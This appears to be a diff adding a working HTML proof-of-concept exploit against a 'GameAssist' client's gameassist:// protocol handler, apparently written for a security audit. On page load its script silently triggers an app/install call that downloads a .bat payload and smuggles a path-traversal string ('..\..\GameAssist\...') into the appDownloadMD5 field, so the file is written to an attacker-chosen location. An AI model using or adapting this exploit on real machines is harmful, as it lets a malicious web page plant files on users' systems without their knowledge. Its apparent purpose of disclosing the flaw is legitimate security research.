@@ -1,0 +1,74 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>GameAssist app/install .bat path traversal write POC</title>
+  <!-- GA_PROTO_APPINSTALL_TRAVERSAL_BAT_POC_4c2a19f8e7d64b10 -->
+  <style>
+    body { font-family: Arial, sans-serif; margin: 32px; line-height: 1.4; }
+    code { background: #f2f2f2; padding: 2px 4px; }
+    button { padding: 8px 12px; }
+  </style>
+</head>
+<body>
+  <h1>GameAssist app/install .bat path traversal write POC</h1>
+  <p>This pure HTML POC must be served from an HTTPS URL that also serves the referenced .bat payload path.</p>
+  <p>Expected write target: <code id="target"></code></p>
+  <button id="run">Run POC</button>
+  <pre id="log"></pre>
+  <script>
+    const marker = "4c2a19f8e7d64b10";
+    const pkg = "com.tencent.mobileqq";
+    const version = "1000001";
+    const prefix = "appinstall_bat_chain_" + marker;
+    const payloadName = "appinstall_payload_bat_" + marker + ".bat";
+    const payloadUrl = new URL(payloadName, location.href);
+    const traversal = "..\\..\\GameAssist\\_audit_tmp\\poc_markers\\" + prefix;
+    const expected = "D:\\Apps\\GameAssist\\_audit_tmp\\poc_markers\\" + prefix + "_" + version + "_" + payloadName;
+
+    const log = (msg) => {
+      document.getElementById("log").textContent += msg + "\n";
+    };
+    document.getElementById("target").textContent = expected;
+
+    function openProtocol(uri) {
+      const a = document.createElement("a");
+      a.href = uri;
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+    }
+
+    function run() {
+      if (!/^https:$/.test(location.protocol)) {
+        log("Serve this HTML over HTTPS first. The client rewrites http:// downloads to https://.");
+        return;
+      }
+
+      const nav = "gameassist://client/gotoRoute?url=" + encodeURIComponent("/app?pkgname=" + pkg);
+      log("Opening: " + nav);
+      openProtocol(nav);
+
+      setTimeout(() => {
+        const query = [
+          "pkgname=" + encodeURIComponent(pkg),
+          "silent=1",
+          "allowOfflineTask=1",
+          "appDownloadLink=" + encodeURIComponent(payloadUrl.href),
+          "appDownloadMD5=" + traversal,
+          "appDownloadVersionCode=" + version,
+          "pgid=audit_proto_chain"
+        ].join("&");
+        const install = "gameassist://app/install?" + query;
+        log("Opening: " + install);
+        openProtocol(install);
+      }, 4000);
+    }
+
+    document.getElementById("run").addEventListener("click", run);
+    if (/^https:$/.test(location.protocol)) {
+      setTimeout(run, 700);
+    }
+  </script>
+</body>
+</html>
